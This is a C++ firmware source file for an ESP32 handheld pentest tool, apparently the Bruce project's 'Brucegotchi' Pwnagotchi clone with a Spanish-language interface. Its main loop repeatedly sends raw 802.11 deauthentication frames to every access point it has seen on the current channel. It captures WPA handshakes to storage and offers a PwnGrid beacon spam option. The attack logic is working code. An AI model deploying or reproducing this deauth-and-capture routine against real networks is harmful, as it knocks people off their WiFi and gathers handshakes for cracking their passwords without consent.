/*
Thanks to thoses developers for their projects:
* @7h30th3r0n3 : https://github.com/7h30th3r0n3/Evil-M5Core2 and https://github.com/7h30th3r0n3/PwnGridSpam
* @viniciusbo : https://github.com/viniciusbo/m5-palnagotchi
* @sduenasg : https://github.com/sduenasg/pio_palnagotchi

Thanks to @bmorcelli for his help doing a better code.
*/
#if !defined(LITE_VERSION)
#include "../wifi/sniffer.h"
#include "../wifi/wifi_atks.h"
#include "core/mykeyboard.h"
#include "core/wifi/wifi_common.h"
#include "esp_err.h"
#include "spam.h"
#include "ui.h"
#include <Arduino.h>

#define STATE_INIT 0
#define STATE_WAKE 1
#define STATE_HALT 255

void advertise(uint8_t channel);
void wakeUp();
void toggle_all_channels();
void brucegotchi_pet();
void brucegotchi_talk();
void brucegotchi_rest();
void brucegotchi_random_mood();
void brucegotchi_status_screen();

uint8_t state;
uint8_t current_channel = 255; // Will wrap to 0 on first increment, starting at first channel
uint32_t last_mood_switch = 10001;
bool pwnagotchi_exit = false;
bool use_all_channels = false; // Toggle flag for all channels

// Primary channels (default: 1, 6, 11)
const uint8_t pri_wifi_channels_default[] = {1, 6, 11};

// all_wifi_channels[] is already defined in sniffer.h - we'll use that

// Pointer to current channel array
const uint8_t *active_channels = pri_wifi_channels_default;
uint8_t active_channels_size = sizeof(pri_wifi_channels_default) / sizeof(pri_wifi_channels_default[0]);

void toggle_all_channels() {
    use_all_channels = !use_all_channels;

    if (use_all_channels) {
        active_channels = all_wifi_channels;
        active_channels_size = sizeof(all_wifi_channels) / sizeof(all_wifi_channels[0]);
        current_channel = 255; // Will wrap to 0 on next increment
    } else {
        active_channels = pri_wifi_channels_default;
        active_channels_size = sizeof(pri_wifi_channels_default) / sizeof(pri_wifi_channels_default[0]);
        current_channel = 255; // Will wrap to 0 on next increment
    }
}

void brucegotchi_pet() {
    setMood(10, "(^__^)", "Gracias. Ahora tengo mas animo.");
    updateUi(true);
    delay(900);
}

void brucegotchi_talk() {
    const char *phrases[] = {
        "Estoy mirando canales y buscando companeros.",
        "Si cambias los canales, puedo explorar mas.",
        "SEL abre mis opciones de interaccion.",
        "Cuando vea amigos, te los muestro abajo."
    };
    setMood(13, "(*__*)", phrases[random(0, sizeof(phrases) / sizeof(phrases[0]))]);
    updateUi(true);
    delay(1200);
}

void brucegotchi_rest() {
    setMood(0, "(v__v)", "Descanso corto. Sigo atento.");
    updateUi(true);
    delay(1200);
}

void brucegotchi_random_mood() {
    setMood(random(2, getNumberOfMoods() - 1));
    updateUi(true);
    delay(900);
}

void brucegotchi_status_screen() {
    tft.fillScreen(bruceConfig.bgColor);
    tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
    tft.setTextSize(1);
    tft.drawRoundRect(8, 8, tftWidth - 16, tftHeight - 16, 8, bruceConfig.priColor);
    tft.drawCentreString("ESTADO BRUCEGOTCHI", tftWidth / 2, 18, 1);

    int y = 46;
    tft.drawString("Canal actual: " + String(ch), 20, y);
    y += 18;
    tft.drawString("Handshakes: " + String(num_HS), 20, y);
    y += 18;
    tft.drawString("Amigos activos: " + String(getPwngridRunTotalPeers()), 20, y);
    y += 18;
    tft.drawString("Amigos vistos: " + String(getPwngridTotalPeers()), 20, y);
    y += 18;
    tft.drawString("RSSI cercano: " + String(getPwngridClosestRssi()), 20, y);
    y += 18;
    tft.drawString(use_all_channels ? "Canales: todos" : "Canales: 1/6/11", 20, y);

    String lastFriend = getPwngridLastFriendName();
    if (lastFriend.length() == 0) lastFriend = "sin amigo cercano";
    tft.drawString("Ultimo: " + lastFriend.substring(0, 22), 20, y + 22);
    tft.drawCentreString("SEL o toque para volver", tftWidth / 2, tftHeight - 28, 1);

    while (!check(AnyKeyPress)) { vTaskDelay(30 / portTICK_RATE_MS); }
    tft.fillScreen(bruceConfig.bgColor);
    drawTopCanvas();
    drawBottomCanvas();
    updateUi(true);
}

void brucegotchi_setup() {
    initPwngrid();
    initUi();
    state = STATE_INIT;
    Serial.println("Brucegotchi Initialized");
}

void brucegotchi_update() {
    if (state == STATE_HALT) { return; }

    if (state == STATE_INIT) {
        state = STATE_WAKE;
        wakeUp();
    }

    if (state == STATE_WAKE) {
        checkPwngridGoneFriends();
        current_channel++; // Sniffer ch variable
        // Cycle through active channels
        if (current_channel >= active_channels_size) { current_channel = 0; }
        ch = active_channels[current_channel];
        advertise(active_channels[current_channel]);
    }
    updateUi(true);
}

void wakeUp() {
    for (uint8_t i = 0; i < active_channels_size; i++) {
        setMood(i % getNumberOfMoods());
        updateUi(false);
        vTaskDelay(1250 / portTICK_RATE_MS);
    }
}

void advertise(uint8_t channel) {
    uint32_t elapsed = millis() - last_mood_switch;
    if (elapsed > 2500) {
        setMood(random(2, getNumberOfMoods() - 1)); // random mood
        last_mood_switch = millis();
    }

    esp_err_t result = pwngridAdvertise(channel, getCurrentMoodFace());

    if (result == ESP_ERR_WIFI_IF) {
        setMood(MOOD_BROKEN, "", "Error: interfaz invalida", true);
        state = STATE_HALT;
    } else if (result == ESP_ERR_INVALID_ARG) {
        setMood(MOOD_BROKEN, "", "Error: argumento invalido", true);
        state = STATE_HALT;
    } else if (result == ESP_ERR_NO_MEM) {
        setMood(MOOD_BROKEN, "", "Error: memoria insuficiente", true);
        state = STATE_HALT;
    } else if (result != ESP_OK) {
        setMood(MOOD_BROKEN, "", "Error desconocido", true);
        state = STATE_HALT;
    }
}

void set_pwnagotchi_exit(bool new_value) { pwnagotchi_exit = new_value; }

void brucegotchi_start() {
    int tmp = 0;              // Control workflow
    bool shot = false;        // Control deauth faces
    bool pwgrid_done = false; // Control to start advertising
    bool Deauth_done = false; // Control to start deauth
    uint8_t _times = 0;       // control delays without impacting control btns
    set_pwnagotchi_exit(false);

    tft.fillScreen(bruceConfig.bgColor);
    num_HS = 0; // restart pwnagotchi counting
    sniffer_reset_handshake_cache();
    registeredBeacons.clear();          // Clear the registeredBeacon array in case it has something
    vTaskDelay(300 / portTICK_RATE_MS); // Due to select button pressed to enter / quit this feature*

    // Prepare storage before enabling promiscuous mode
    FS *handshakeFs = nullptr;
    if (setupSdCard()) {
        isLittleFS = false;
        if (!SD.exists("/BrucePCAP")) SD.mkdir("/BrucePCAP");
        if (!SD.exists("/BrucePCAP/handshakes")) SD.mkdir("/BrucePCAP/handshakes");
        handshakeFs = &SD;
    } else {
        if (!LittleFS.exists("/BrucePCAP")) LittleFS.mkdir("/BrucePCAP");
        if (!LittleFS.exists("/BrucePCAP/handshakes")) LittleFS.mkdir("/BrucePCAP/handshakes");
        isLittleFS = true;
        handshakeFs = &LittleFS;
    }
    if (handshakeFs) {
        sniffer_prepare_storage(handshakeFs, !isLittleFS);
        sniffer_set_mode(SnifferMode::HandshakesOnly);
        sniffer_reset_handshake_cache();
    }

    brucegotchi_setup(); // Starts the thing
    // Draw footer & header
    drawTopCanvas();
    drawBottomCanvas();
    memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default)); // prepares the Deauth frame
    sniffer_set_mode(SnifferMode::HandshakesOnly); // Pwnagotchi only looks for handshakes

#if defined(HAS_TOUCH)
    TouchFooter();
#endif
    brucegotchi_update();

    tmp = millis();
    // LET'S GOOOOO!!!
    while (true) {
        if (millis() - tmp < 2000 && !Deauth_done) {
            Deauth_done = true;
            drawMood("(-@_@)", "Preparando deauth sniper");
        }
        if (millis() - tmp > (2000 + 1000 * _times) && Deauth_done && !pwgrid_done) {

            if (registeredBeacons.size() > 30)
                registeredBeacons.clear(); // Clear registered beacons to restart search and avoid restarts
            // Serial.println("<<---- Starting Deauthentication Process ---->>");
            for (auto registeredBeacon : registeredBeacons) {
                char _MAC[20];
                sprintf(
                    _MAC,
                    "%02X:%02X:%02X:%02X:%02X:%02X",
                    registeredBeacon.MAC[0],
                    registeredBeacon.MAC[1],
                    registeredBeacon.MAC[2],
                    registeredBeacon.MAC[3],
                    registeredBeacon.MAC[4],
                    registeredBeacon.MAC[5]
                );
                // Serial.println(
                //     String(_MAC) + " on ch" + String(registeredBeacon.channel) + " -> we are now on ch " +
                //     String(ch)
                // );
                if (registeredBeacon.channel == ch) {
                    memcpy(&ap_record.bssid, registeredBeacon.MAC, 6);
                    wsl_bypasser_send_raw_frame(
                        &ap_record, registeredBeacon.channel
                    ); // writes the buffer with the information
                    send_raw_frame(deauth_frame, 26);
                }
                if (SelPress) break; // stops deauthing if select button is pressed
            }
            // Serial.println("<<---- Stopping Deauthentication Process ---->>");
            drawMood(shot ? "(<<_<<)" : "(>>_>>)", shot ? "Laser activo. Deautenticando" : "pew! pew! pew!");
            _times++;
            shot = !shot;
        }
        if (millis() - tmp > 12000 && pwgrid_done == false) {
            drawMood("(^__^)", "Vamos a hacer amigos");
            _times = 0;
            pwgrid_done = true;
        }
        if (pwgrid_done && millis() - tmp > (12000 + 3000 * _times)) {
            _times++;
            advertise(ch);
            updateUi(true);
        }
        if (millis() - tmp > 29500) {
            _times = 0;
            tmp = millis();
            pwgrid_done = false;
            Deauth_done = false;
            brucegotchi_update();
        }
        if (check(SelPress)) {
            // Build options menu with channel toggle status
            String channel_status = use_all_channels ? "Todos los canales: ON" : "Todos los canales: OFF";

            // moved down here to reset the options, due to use in other parts in pwngrid spam
            options = {
                {"Hablar con Bruce", brucegotchi_talk},
                {"Acariciar", brucegotchi_pet},
                {"Ver estado", brucegotchi_status_screen},
                {"Cambiar humor", brucegotchi_random_mood},
                {"Descanso corto", brucegotchi_rest},
                {"Spam Pwngrid", send_pwnagotchi_beacon_main},
                {channel_status.c_str(), toggle_all_channels},
                {"Menu principal", lambdaHelper(set_pwnagotchi_exit, true)},
            };
            // Display menu
            loopOptions(options);
            // Redraw footer & header
            tft.fillScreen(bruceConfig.bgColor);
            drawTopCanvas();
            drawBottomCanvas();
            updateUi(true);
        }
        if (pwnagotchi_exit) { break; }
        vTaskDelay(10 / portTICK_RATE_MS);
    }

    // Turn off WiFi
    esp_wifi_set_promiscuous(false);
    esp_wifi_set_promiscuous_rx_cb(nullptr);
    wifiDisconnect();
}
#endif
